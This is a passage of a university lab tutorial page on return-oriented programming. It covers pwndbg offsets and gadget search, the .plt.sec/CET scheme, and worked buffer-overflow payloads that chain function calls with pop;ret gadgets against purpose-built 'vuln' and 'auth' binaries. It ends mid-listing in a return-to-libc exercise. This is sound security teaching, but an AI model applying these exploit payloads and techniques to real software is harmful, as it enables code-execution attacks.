address 0x61616174\n[...]\npwndbg> cyclic -l 0x61616174\n76\n")),(0,i.yg)("p",null,"From the above commands we can deduce that ",(0,i.yg)("inlineCode",{parentName:"p"},"EIP"),"'s offset relative to the start of\nthe buffer is 76, as the address that ",(0,i.yg)("inlineCode",{parentName:"p"},"EIP")," points to is ",(0,i.yg)("inlineCode",{parentName:"p"},"0x61616174"),", i.e.\n",(0,i.yg)("inlineCode",{parentName:"p"},"'taaa'"),", which lies at offset 76 in the cyclic pattern we've just generated."),(0,i.yg)("h3",{id:"checksec-in-pwndbg"},"checksec in pwndbg"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"pwndbg> checksec\n[*] '/media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n")),(0,i.yg)("h3",{id:"finding-gadgets-in-pwndbg"},"Finding Gadgets in ",(0,i.yg)("inlineCode",{parentName:"h3"},"pwndbg")),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'pwndbg> rop\nGadgets information\n============================================================\n0x080490fa : adc al, 0x68 ; sbb al, 0xc0 ; add al, 8 ; call eax\n0x08049146 : adc byte ptr [eax + 0x68], dl ; sbb al, 0xc0 ; add al, 8 ; call edx\n0x08049104 : adc cl, cl ; ret\n0x0804909b : adc dword ptr [eax - 0x2e], -1 ; call dword ptr [eax - 0x73]\n0x0804917c : add al, 8 ; add ecx, ecx ; ret\n0x080490fe : add al, 8 ; call eax\n0x0804914b : add al, 8 ; call edx\n0x0804918c : add byte ptr [eax], al ; add byte ptr [eax], al ; endbr32 ; jmp 0x8049120\n[...]\n\nUnique gadgets found: 121\n\npwndbg> rop --grep "pop .* ; pop .* ; ret"  # you can perform a finer search using the --grep parameter and regular expressions\n0x0804923d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804923c : jecxz 0x80491c1 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret\n0x0804923b : jne 0x8049220 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804923e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret\n0x0804923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret\n0x08049240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08049242 : pop edi ; pop ebp ; ret\n0x08049241 : pop esi ; pop edi ; pop ebp ; ret\n')),(0,i.yg)("h2",{id:"further-reading"},"Further Reading"),(0,i.yg)("h3",{id:"rop-gadgets-in-pwntools"},(0,i.yg)("inlineCode",{parentName:"h3"},"ROP")," Gadgets in ",(0,i.yg)("inlineCode",{parentName:"h3"},"pwntools")),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"pwntools")," has a rather advanced ",(0,i.yg)("a",{parentName:"p",href:"https://docs.pwntools.com/en/stable/rop/rop.html"},(0,i.yg)("inlineCode",{parentName:"a"},"ROP")," module")," that is capable of crafting ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," attacks corresponding to various functions by creating concatenating chains of ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," addresses, also known as ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," chains."),(0,i.yg)("p",null,"For this session, you won't need to use this module, but it may come in handy in the future."),(0,i.yg)("h3",{id:"linux-x86-program-start-up"},"Linux x86 Program Start Up"),(0,i.yg)("p",null,"Notice that the ",(0,i.yg)("inlineCode",{parentName:"p"},"__libc_start_main")," will always be present in the relocation table.\nAs you discovered in the session dedicated to ",(0,i.yg)("a",{parentName:"p",href:"https://github.com/hexcellents/sss-binary/tree/master/sessions/executable-file-formats"},"executable file formats"),", this is the function called by the code from the ",(0,i.yg)("inlineCode",{parentName:"p"},"_start")," label, which, in turn, calls the ",(0,i.yg)("inlineCode",{parentName:"p"},"main()")," function."),(0,i.yg)("p",null,"To find more details about the startup of a Linux x86 program, you can read about it ",(0,i.yg)("a",{parentName:"p",href:"http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html"},"here"),"."),(0,i.yg)("h3",{id:"the-pltsec-schema"},"The ",(0,i.yg)("inlineCode",{parentName:"h3"},".plt.sec")," Schema"),(0,i.yg)("p",null,"Let's go back to the small piece of code at the beginning of this lecture:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},'#include <stdio.h>\n\nint main(void)\n{\n    puts("Hello world!");\n    return 0;\n}\n')),(0,i.yg)("p",null,'If we compile it with a more modern (later than 2019) version of even the most "old-school" compilers, such as ',(0,i.yg)("inlineCode",{parentName:"p"},"gcc"),", we will notice a slight (but actually important) difference in the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," schema used by the resulting binary file."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ gcc -m32 -fno-PIC -no-pie hello.c -o hello\n$ objdump -M intel -d hello\n[...]\nDisassembly of section .plt:\n\n08049030 <.plt>:\n 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004\n 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008\n 804903c:       0f 1f 40 00             nop    DWORD PTR [eax+0x0]\n 8049040:       f3 0f 1e fb             endbr32\n 8049044:       68 00 00 00 00          push   0x0\n 8049049:       e9 e2 ff ff ff          jmp    8049030 <.plt>\n 804904e:       66 90                   xchg   ax,ax\n 8049050:       f3 0f 1e fb             endbr32\n 8049054:       68 08 00 00 00          push   0x8\n 8049059:       e9 d2 ff ff ff          jmp    8049030 <.plt>\n 804905e:       66 90                   xchg   ax,ax\n\nDisassembly of section .plt.sec:\n\n08049060 <puts@plt>:\n 8049060:       f3 0f 1e fb             endbr32\n 8049064:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c\n 804906a:       66 0f 1f 44 00 00       nop    WORD PTR [eax+eax*1+0x0]\n[...]\n")),(0,i.yg)("p",null,"Now it seems there are two ",(0,i.yg)("inlineCode",{parentName:"p"},".plt"),' sections: the "classic" ',(0,i.yg)("inlineCode",{parentName:"p"},".plt")," and a new ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," section.\nMoreover, the entries in the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," section are very similar to those we've previously shown as being part of ",(0,i.yg)("inlineCode",{parentName:"p"},".plt"),".\nSo why 2 ",(0,i.yg)("inlineCode",{parentName:"p"},".plt"),"'s?\nAnd if the initial ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," entries have been moved over to ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec"),", what is the purpose of the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," section now?"),(0,i.yg)("p",null,"First, let's check the call to ",(0,i.yg)("inlineCode",{parentName:"p"},"puts()")," itself:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -D -j .text -M intel hello | grep puts\n 80491b3:   e8 a8 fe ff ff          call   8049060 <puts@plt>\n")),(0,i.yg)("p",null,"So we see that the function being called now resides in the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," section.\nWhat about the offset that ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," redirect jumps to (i.e. ",(0,i.yg)("inlineCode",{parentName:"p"},"0x804c00c"),")?"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -s -M intel -j .got.plt --start-address=0x0804c00c hello\n\nhello:     file format elf32-i386\n\nContents of section .got.plt:\n 804c00c 40900408 50900408                    @...P...\n")),(0,i.yg)("p",null,"Similarly to what we did previously, we now see that ",(0,i.yg)("inlineCode",{parentName:"p"},"0x804c00c")," points to\naddress ",(0,i.yg)("inlineCode",{parentName:"p"},"0x08049040"),", which is this code inside the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," section:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"8049040:       f3 0f 1e fb             endbr32\n8049044:       68 00 00 00 00          push   0x0\n8049049:       e9 e2 ff ff ff          jmp    8049030 <.plt>\n804904e:       66 90                   xchg   ax,ax\n")),(0,i.yg)("p",null,"So with the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," schema, there are 2 redirects: one from ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," to ",(0,i.yg)("inlineCode",{parentName:"p"},".got")," (or ",(0,i.yg)("inlineCode",{parentName:"p"},".got.plt")," to be more precise) and another from ",(0,i.yg)("inlineCode",{parentName:"p"},".got.plt")," to ",(0,i.yg)("inlineCode",{parentName:"p"},".plt"),".\nNotice in the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," stub above that, like before, ",(0,i.yg)("inlineCode",{parentName:"p"},"0x0")," is pushed onto the stack before the resolver is called, so that the dynamic linker can change it to the actual address of ",(0,i.yg)("inlineCode",{parentName:"p"},"puts()")," from libc."),(0,i.yg)("p",null,"So why use ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," at all if in the end it looks like it does the same thing?\nWell, ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," is an x86-only security enhancement of the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," section (hence the ",(0,i.yg)("inlineCode",{parentName:"p"},".sec")," part of the name, duh...), that is used only when a security enhancement feature called ",(0,i.yg)("strong",{parentName:"p"},"CET (Control-flow Enforcement Technology)")," is enabled.\nIn this comment, I'll explain what the feature is and why we have two PLT sections if CET is enabled."),(0,i.yg)("p",null,'So, what does CET do?\nCET introduces a new restriction to indirect jump instructions.\nIn order to understand how CET works, let\'s assume that it is enabled.\nThen, if you execute an indirect jump instruction, the processor verifies that a special "landing pad" instruction, which is actually a repurposed ',(0,i.yg)("inlineCode",{parentName:"p"},"NOP")," instruction (now called ",(0,i.yg)("inlineCode",{parentName:"p"},"endbr32")," or ",(0,i.yg)("inlineCode",{parentName:"p"},"endbr64"),", as you can see in the above snippets), is at the jump target.\nIf the jump target does not start with that instruction, the processor raises an exception instead of continuing to execute code."),(0,i.yg)("p",null,"If CET is enabled, the compiler places ",(0,i.yg)("inlineCode",{parentName:"p"},"endbr")," instructions to all locations where indirect jumps may lead.\nThis mechanism makes it extremely hard to transfer the control to a middle of a function that is not supported to be a indirect jump target, preventing certain types of attacks, such as ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," or JOP (jump-oriented programming; very similar to ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP"),")."),(0,i.yg)("p",null,"Now, let's explain why we have this extra PLT section for when CET is enabled.\nSince you can indirectly jump to a PLT entry, we have to make PLT entries start with an ",(0,i.yg)("inlineCode",{parentName:"p"},"endbr")," instruction.\nThe problem is there was no extra space for ",(0,i.yg)("inlineCode",{parentName:"p"},"endbr")," (which is 4 bytes long) in the old ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," entry schema, as the PLT entry is only 16 bytes long and all of them are already used."),(0,i.yg)("p",null,"In order to deal with the issue, each PLT entry was split into two separate entries.\nRemember that each PLT entry contains code to jump to an address read from ",(0,i.yg)("inlineCode",{parentName:"p"},".got.plt")," ",(0,i.yg)("strong",{parentName:"p"},"AND")," code to resolve a dynamic symbol lazily.\nWith the 2-PLT schema, the former code is written to ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec"),", and the latter code is written to ",(0,i.yg)("inlineCode",{parentName:"p"},".plt"),", as demonstrated above."),(0,i.yg)("h4",{id:"more-about-cet-and-endbr"},"More about CET and ",(0,i.yg)("inlineCode",{parentName:"h4"},"endbr")),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"A more in-depth look at the inner workings of CET and the concept of the ",(0,i.yg)("strong",{parentName:"li"},"Shadow Stack")," that it uses, can be found ",(0,i.yg)("a",{parentName:"li",href:"https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html"},"here")," and ",(0,i.yg)("a",{parentName:"li",href:"https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html"},"here")),(0,i.yg)("li",{parentName:"ul"},"The way ",(0,i.yg)("inlineCode",{parentName:"li"},"endbr")," instructions interact with the CPU is explained ",(0,i.yg)("a",{parentName:"li",href:"https://cdrdv2.intel.com/v1/dl/getContent/631121"},"here"),", at page 38")),(0,i.yg)("h4",{id:"tldr"},"TLDR"),(0,i.yg)("p",null,"Lazy symbol resolution in the 2-PLT schema works in the usual way, except that the regular ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," is now called ",(0,i.yg)("inlineCode",{parentName:"p"},".plt.sec")," and ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," is repurposed to contain only code for lazy symbol resolution."),(0,i.yg)("h2",{id:"putting-it-all-together-demo"},"Putting it All Together: Demo"),(0,i.yg)("p",null,"Now that we've learned the theoretical aspects of what Return-Oriented Programming is, let's put everything in practice as part of a demo."),(0,i.yg)("p",null,"Navigate to the folder ",(0,i.yg)("a",{parentName:"p",href:"activities/00-demo"},"00-demo"),".\nNotice that it contains two executables, one compiled for 32 bits (",(0,i.yg)("inlineCode",{parentName:"p"},"vuln"),") and the other for 64 bits (",(0,i.yg)("inlineCode",{parentName:"p"},"vuln64"),")."),(0,i.yg)("p",null,"Looking at their source code (it's one and the same for both of them), we can easily identify their vulnerability: the ",(0,i.yg)("inlineCode",{parentName:"p"},"reader")," function reads (duh...) 128 bytes from ",(0,i.yg)("inlineCode",{parentName:"p"},"stdin")," into a buffer whose capacity is only 64 bytes.\nSo we'll be able to overflow this buffer.\nWe aim to do this in order to showcase the concept of ",(0,i.yg)("strong",{parentName:"p"},"code reuse"),"."),(0,i.yg)("h3",{id:"calling-a-function"},"Calling a Function"),(0,i.yg)("p",null,"The most basic type of code reuse is calling a function.\nFor this, we'll be calling the ",(0,i.yg)("inlineCode",{parentName:"p"},"warcraft")," function in the ",(0,i.yg)("inlineCode",{parentName:"p"},"vuln")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"vuln64")," binaries mentioned above."),(0,i.yg)("p",null,"In order to do this, we'll need to know:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"the offset of the return address inside our buffer"),(0,i.yg)("li",{parentName:"ul"},"the address of the ",(0,i.yg)("inlineCode",{parentName:"li"},"warcraft")," function inside the binary.")),(0,i.yg)("p",null,"For all our exploits we'll be using the ",(0,i.yg)("inlineCode",{parentName:"p"},"exploit.py")," script, which is also available in the ",(0,i.yg)("a",{parentName:"p",href:"activities/00-demo"},"00-demo")," folder.\nNotice that ",(0,i.yg)("inlineCode",{parentName:"p"},"pwntools")," provides a functionality similar to ",(0,i.yg)("inlineCode",{parentName:"p"},"nm"),", by which we can obtain the addresses of various symbols in the binary (as long as it hasn't been stripped):"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},'e = ELF(filename)\nwarcraft_address = e.symbols[b"warcraft"]\n')),(0,i.yg)("p",null,"As of now, requirement #2 mentioned above is complete.\nIn order to also complete the first requirement, we'll use ",(0,i.yg)("inlineCode",{parentName:"p"},"objdump")," and check the ",(0,i.yg)("inlineCode",{parentName:"p"},"reader")," function:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -M intel -d vuln\n08048529 <reader>:\n 8048529:       55                      push   ebp\n 804852a:       89 e5                   mov    ebp,esp\n 804852c:       83 ec 40                sub    esp,0x40\n [...]\n 804853c:       a1 40 a0 04 08          mov    eax,ds:0x804a040\n 8048541:       50                      push   eax\n 8048542:       68 80 00 00 00          push   0x80\n 8048547:       8d 45 c0                lea    eax,[ebp-0x40]\n 804854a:       50                      push   eax\n 804854b:       e8 10 fe ff ff          call   8048360 <fgets@plt>\n")),(0,i.yg)("p",null,"Our vulnerable buffer is the first parameter of ",(0,i.yg)("inlineCode",{parentName:"p"},"fgets"),", which is at offset ",(0,i.yg)("inlineCode",{parentName:"p"},"ebp - 0x40")," i.e. ",(0,i.yg)("inlineCode",{parentName:"p"},"ebp - 64"),".\nWhich means that the offset of the return address is ",(0,i.yg)("inlineCode",{parentName:"p"},"64 + 4 = 68")," bytes into this buffer (remember how a stack frame looks like)."),(0,i.yg)("p",null,"So, in order to call the ",(0,i.yg)("inlineCode",{parentName:"p"},"warcraft")," function, we'll give our binary a payload made up of a padding of 68 bytes, followed by the address of ",(0,i.yg)("inlineCode",{parentName:"p"},"warcraft"),", written in little endian representation, which can be written like this:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},'offset = 0x40 + 4\npayload = offset * b"A" + pack(warcraft_address)\n')),(0,i.yg)("p",null,"Now our exploit is done.\nIn order to perform this exploit on ",(0,i.yg)("inlineCode",{parentName:"p"},"vuln64"),", simply run ",(0,i.yg)("inlineCode",{parentName:"p"},"objdump")," on this binary and remember that the length of a pointer on a 64-bit architecture is 8 bytes, which means that the offset of the return address is going to be ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp + 8"),"."),(0,i.yg)("p",null,"One thing to keep in mind is that you are by no means required to use addresses that point to the beginning of functions in your payloads.\nYou can use any valid address from the ",(0,i.yg)("inlineCode",{parentName:"p"},".text")," section and the exploit should work just fine in executing code from the address you provide it."),(0,i.yg)("p",null,"Now on to our next scenario: what if the function we're calling requires a parameter?"),(0,i.yg)("h3",{id:"calling-a-function-with-parameters"},"Calling a Function with Parameters"),(0,i.yg)("p",null,"Let's first look at the stack of a function when it's called \"normally\", i.e. with a ",(0,i.yg)("inlineCode",{parentName:"p"},"call")," instruction.\nLet's use the ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch")," function in ",(0,i.yg)("inlineCode",{parentName:"p"},"vuln.c")," as an example.\nThe picture below shows where its parameter is placed."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"Overwatch Stack",src:a(8888).A,width:"791",height:"296"})),(0,i.yg)("p",null,"Furthermore, as expected, the function retrieves its parameter from address ",(0,i.yg)("inlineCode",{parentName:"p"},"ebp + 8"),", as shown above.\nHow can we craft a payload so that, upon entering the function, the required ",(0,i.yg)("inlineCode",{parentName:"p"},"0xdeadbeef")," parameter is where the function expects it to be?"),(0,i.yg)("p",null,"We'll obviously need to place ",(0,i.yg)("inlineCode",{parentName:"p"},"0xdeadbeef")," on the stack (in little endian representation, of course), but where?\nAfter the function's preamble (",(0,i.yg)("inlineCode",{parentName:"p"},"push ebp; mov esp, ebp"),"), ",(0,i.yg)("inlineCode",{parentName:"p"},"ebp")," points to the location where the previous stack pointer it saved.\nAbove it, the function expects to find its return address.\nThus, we need to write 4 padding bytes in its place.\nThe next 4 bytes are the first parameter.\nJust for reference, the next 4 bytes (",(0,i.yg)("inlineCode",{parentName:"p"},"ebp + 12"),") are the second parameter and so on.\nSo, in order to call ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch")," with the ",(0,i.yg)("inlineCode",{parentName:"p"},"0xdeadbeef")," parameter, the payload would look like this:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},'payload = offset * b"A" + pack(overwatch_address) + 4 * b"B" + pack(0xdeadbeef)\n')),(0,i.yg)("p",null,"Take a look at those 4 ",(0,i.yg)("inlineCode",{parentName:"p"},"B"),"'s in the payload above.\nWe agreed that they are ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch"),"'s expected return address.\nSo if we wanted to call another function, we would only need to replace them with that function's address.\nPretty simple, right?\nBut what if we wanted to call a third function?\nWell, then we would need to overwrite the next 4 bytes in our payload with a third address.\nEasy!\nBut now we have actually run into trouble: the next 4 bytes are ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch"),"'s parameter.\nIn this situation it looks like we ",(0,i.yg)("strong",{parentName:"p"},"either")," call ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch")," or we call a third function.\nNot cool.\nIn this case, ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch"),"s stack would look like this:"),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"Overwatch Stack with Conflicting Parameter/Address",src:a(1408).A,width:"791",height:"296"})),(0,i.yg)("p",null,"It seems we need another mechanism so that we can call ",(0,i.yg)("strong",{parentName:"p"},"all 3 functions")," with all their correct parameters.\nEnter ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP"),"s!"),(0,i.yg)("h3",{id:"calling-multiple-functions"},"Calling Multiple Functions"),(0,i.yg)("p",null,"What we need in order to solve the dilemma presented above is a means by which to ",(0,i.yg)("strong",{parentName:"p"},"remove")," ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch"),"'s parameter (i.e.  ",(0,i.yg)("inlineCode",{parentName:"p"},"0xdeadbeef"),") from the stack once the function is finished.\nWe know that the ",(0,i.yg)("inlineCode",{parentName:"p"},"pop")," instruction is good for removing stuff from the stack.\nSo what we need is to execute the following two instructions:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-asm"},"pop <any_register>\nret\n")),(0,i.yg)("p",null,"Since ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," is equivalent to ",(0,i.yg)("inlineCode",{parentName:"p"},"pop eip"),", the above code removes ",(0,i.yg)("inlineCode",{parentName:"p"},"0xdeadbeef")," from the stack and places the instruction pointer (",(0,i.yg)("inlineCode",{parentName:"p"},"eip"),") at the address lying on the stack above ",(0,i.yg)("inlineCode",{parentName:"p"},"0xdeadbeef"),".\nOne thing to keep in mind is that now we're only interested in clearing the stack, so ",(0,i.yg)("inlineCode",{parentName:"p"},"pop")," can be used with any 32 bit register."),(0,i.yg)("p",null,"As a result, ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch"),"'s stack should look like the one in the image below.\nNotice there are no more conflicts now.\nHurrah!"),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"Overwatch Stack without Conflicting Parameters and Addresses",src:a(4478).A,width:"791",height:"376"})),(0,i.yg)("h4",{id:"finding-gadgets---ropgadget"},"Finding Gadgets - ",(0,i.yg)("inlineCode",{parentName:"h4"},"ROPgadget")),(0,i.yg)("p",null,"The ",(0,i.yg)("inlineCode",{parentName:"p"},"pop; ret")," instructions above are called a ",(0,i.yg)("strong",{parentName:"p"},"gadget"),", i.e. a small group of ",(0,i.yg)("strong",{parentName:"p"},"consecutive")," instructions that ends in ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," and which can be used to alter the execution of a given program.\nSince all binaries contain a ",(0,i.yg)("inlineCode",{parentName:"p"},".text")," section, which is made up of instructions, all binaries contain gadgets.\nLots of them."),(0,i.yg)("p",null,"The tool that we're going to use in order to find such gadgets is called ",(0,i.yg)("inlineCode",{parentName:"p"},"ROPgadget"),".\nIt is already installed in the Kali VM and if you're working on another environment, you can install it by following the instructions in the tool's ",(0,i.yg)("a",{parentName:"p",href:"https://github.com/JonathanSalwan/ROPgadget"},"GitHub repository"),"."),(0,i.yg)("p",null,"In order to run ",(0,i.yg)("inlineCode",{parentName:"p"},"ROPgadget")," from your terminal, you need to specify a binary file to it using the ",(0,i.yg)("inlineCode",{parentName:"p"},"--binary")," parameter.\nIt is also recommended (if you know what gadgets you're looking for) to filter those you need using the ",(0,i.yg)("inlineCode",{parentName:"p"},"--only")," parameter.\nAs a result, in order to obtain a ",(0,i.yg)("inlineCode",{parentName:"p"},"pop; ret")," gadget, we need to run the following command:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ROPgadget --binary vuln --only "pop|ret"\nGadgets information\n============================================================\n0x080485eb : pop ebp ; ret\n0x080485e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048331 : pop ebx ; ret\n0x080485ea : pop edi ; pop ebp ; ret\n0x080485e9 : pop esi ; pop edi ; pop ebp ; ret\n0x0804831a : ret\n0x0804819c : ret 0x3e41\n0x0804844e : ret 0xeac1\n')),(0,i.yg)("p",null,"Thus, the payload needed in order to call both ",(0,i.yg)("inlineCode",{parentName:"p"},"overwatch")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"warcraft")," is the one showcased below, with ",(0,i.yg)("inlineCode",{parentName:"p"},"pop_ret_gadget_address")," being set to ",(0,i.yg)("inlineCode",{parentName:"p"},"0x08048331")," from the output above."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},'payload = offset * b"A" + pack(overwatch_address) + pack(pop_ret_gadget_address)\n    + pack(0xdeadbeef) + pack(warcraft_address)\n')),(0,i.yg)("p",null,"Notice this yet is another example of ",(0,i.yg)("strong",{parentName:"p"},"code reuse")," since we're reusing various chunks of instructions already present in our binary."),(0,i.yg)("h2",{id:"challenges"},"Challenges"),(0,i.yg)("h3",{id:"01-tutorial---bypass-nx-stack-with-return-to-libc"},"01. Tutorial - Bypass NX Stack with return-to-libc"),(0,i.yg)("p",null,"Go to the ",(0,i.yg)("a",{parentName:"p",href:"activities/01-tutorial-ret-to-libc/src/"},(0,i.yg)("inlineCode",{parentName:"a"},"01-tutorial-ret-to-libc/"))," folder."),(0,i.yg)("p",null,"In the previous sessions we used stack overflow vulnerabilities to inject new code into a running process (on its stack) and redirect execution to it.\nThis attack is easily defeated by making the stack, together with any other memory page that can be modified, non-executable.\nThis is achieved by setting the ",(0,i.yg)("inlineCode",{parentName:"p"},"NX")," bit in the page table of the current process."),(0,i.yg)("p",null,"We will try to bypass this protection for the ",(0,i.yg)("inlineCode",{parentName:"p"},"01-tutorial-ret-to-libc/src/auth")," binary in the lab archive.\nFor now, disable ASLR in the a new shell:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"setarch $(uname -m) -R /bin/bash\n")),(0,i.yg)("p",null,"Let's take a look at the program headers and confirm that the stack is no longer executable.\nWe only have read and write (RW) permissions for the stack area.\nThe auth binary requires the ",(0,i.yg)("inlineCode",{parentName:"p"},"libssl1.0.0:i386")," Debian package to work.\nYou can find ",(0,i.yg)("inlineCode",{parentName:"p"},"libssl1.0.0:i386")," Debian package ",(0,i.yg)("a",{parentName:"p",href:"https://packages.debian.org/jessie/i386/libssl1.0.0/download"},"here"),"."),(0,i.yg)("p",null,"First, let's check that ",(0,i.yg)("inlineCode",{parentName:"p"},"NX")," bit we mentioned earlier:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ checksec auth\n    [...]\n    NX:       NX enabled\n    [...]\n")),(0,i.yg)("p",null,"For completeness, lets check that there is indeed a buffer (stack) overflow vulnerability."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"python2.7 -c 'print \"A\" * 1357' | ltrace -i ./auth\n")),(0,i.yg)("p",null,"Check the source file - the buffer length is 1337 bytes.\nThere should be a base pointer and the ",(0,i.yg)("inlineCode",{parentName:"p"},"main()"),"'s return address just before it on the stack.\nThere is also some alignment involved, but we can easily try a few lengths to get the right position of the return address.\nSeems to be 1337 + 16 followed by the return address for this case.\nYou can, of course, determine the distance between the buffer's start address and the frame's return address exactly using objdump, but we will leave that as an exercise."),(0,i.yg)("p",null,"We can now jump anywhere.\nUnfortunately, we cannot put a shellcode in the buffer and jump into it because the stack is non-executable now.\nLets try it with a few ",(0,i.yg)("inlineCode",{parentName:"p"},"NOP"),"s.\nOur buffer's address is ",(0,i.yg)("inlineCode",{parentName:"p"},"0xbfffee63")," (see the ",(0,i.yg)("inlineCode",{parentName:"p"},"gets()")," call)."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ python2.7 -c \'print "\\x90\\x90\\x90\\x90" + "A" * 1349 + "\\x63\\xee\\xff\\xbf"\' | ltrace -i ./auth\n[0x80484f1] __libc_start_main(0x80486af, 1, 0xbffff454, 0x80486c0, 0x8048730 <unfinished ...>\n[0x8048601] malloc(20)                                                                            = 0x0804b008\n[0x80485df] puts("Enter password: "Enter password:\n)                                                              = 17\n[0x80485ea] gets(0xbfffee63, 0x8048601, 0x80486af, 0xb7cdecb0, 0xb7cdecb7)                        = 0xbfffee63\n[0x8048652] memset(0x0804b008, \'\\000\', 20)                                                        = 0x0804b008\n[0x8048671] SHA1(0xbfffee63, 137, 0x804b008, 4, 0x90000001)                                       = 0x804b008\n[0xbfffee63] --- SIGSEGV (Segmentation fault) ---\n[0xffffffff] +++ killed by SIGSEGV +++\n')),(0,i.yg)("p",null,"Guess what?\nIt didn't work.\nHow about we try to jump to some existing code?\nFirst, let's take a look at the ",(0,i.yg)("inlineCode",{parentName:"p"},"check_password()")," function."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ objdump -M intel -d auth | grep -A 15 "<check_password>:"\n080485ec <check_password>:\n 80485ec:   55                      push   ebp\n 80485ed:   89 e5                   mov    ebp,esp\n 80485ef:   81 ec 58 05 00 00       sub    esp,0x558\n 80485f5:   c7 04 24 14 00 00 00    mov    DWORD PTR [esp],0x14\n 80485fc:   e8 9f fe ff ff          call   80484a0 <malloc@plt>\n 8048601:   a3 38 a0 04 08          mov    ds:0x804a038,eax\n 8048606:   a1 38 a0 04 08          mov    eax,ds:0x804a038\n 804860b:   85 c0                   test   eax,eax\n 804860d:   75 18                   jne    8048627 <check_password+0x3b>\n 804860f:   c7 04 24 76 87 04 08    mov    DWORD PTR [esp],0x8048776\n 8048616:   e8 95 fe ff ff          call   80484b0 <puts@plt>\n 804861b:   c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1\n 8048622:   e8 99 fe ff ff          call   80484c0 <exit@plt>\n 8048627:   8d 85 bb fa ff ff       